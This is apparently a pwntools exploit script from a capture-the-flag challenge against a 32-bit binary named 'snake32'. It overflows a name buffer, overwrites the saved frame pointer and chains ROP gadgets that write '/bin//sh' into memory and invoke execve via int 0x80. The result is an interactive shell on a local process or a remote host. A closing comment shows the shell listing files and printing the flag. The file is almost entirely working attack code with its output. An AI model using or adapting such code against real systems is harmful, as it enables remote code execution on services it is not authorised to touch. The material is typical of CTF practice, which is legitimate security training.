#!/usr/bin/env python

from pwn import *
import sys


def exploit(r):
	
	r.recvuntil("[*] Play")
	r.send("\n")

	r.recvuntil('Name:')

	payload = "A" * 0x100
	payload += p32(0x11111111)
	payload += "CCCC"
	payload += "DDDD"
	payload += p32(0x080ec430)  # ebp
	payload += p32(0x0806d159)	# : add esp, 4 ; ret
	payload += p32(0x7f8637b8)

	p = ''
	p += p32(0x080707ca) # pop edx ; ret
	p += p32(0x080ec450) # @ .data
	p += p32(0x08059cdb) # : pop eax ; or dh, dh ; ret
	p += '/bin'
	p += p32(0x0806dfa6) # : mov dword ptr [edx], eax ; pop ebx ; ret
	p += p32(0xFFFFFFFF)
	p += p32(0x080707ca) # pop edx ; ret
	p += p32(0x080ec454) # @ .data + 4
	p += p32(0x08059cdb) # : pop eax ; or dh, dh ; ret
	p += '//sh'
	p += p32(0x0806dfa6) # : mov dword ptr [edx], eax ; pop ebx ; ret
	p += p32(0xFFFFFFFF)

	p += p32(0x080707ca) # pop edx ; ret
	p += p32(0x080ec45c) # @ .data + 8
	p += p32(0x08059cdb) # : pop eax ; or dh, dh ; ret
	p += p32(0x080ec450) # @ .data
	p += p32(0x0806dfa6) # : mov dword ptr [edx], eax ; pop ebx ; ret
	p += p32(0x080ec450) # @ .data

	p += p32(0x080707f1) # pop ecx ; pop ebx ; ret
	p += p32(0x080ec45c) # @ .data + 8
	p += p32(0x080ec450) # padding without overwrite ebx
	p += p32(0x080707ca) # pop edx ; ret
	p += p32(0x080ec460) # @ .data + 8
	p += p32(0x08055d70) # xor eax, eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0807d26f) # inc eax ; ret
	p += p32(0x0804a3b1) # int 0x80

	payload += p

	r.sendline(payload)

	r.interactive()
	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/bioterra/snake32'])
        print util.proc.pidof(r)
        pause()
        exploit(r)

'''
$ ls
bin
flag.txt
realflag.txt
snake32
$ cat realflag.txt
flag{Umofuhedu554Ev3ryoneL0vesForm4tStr1ngs}
'''
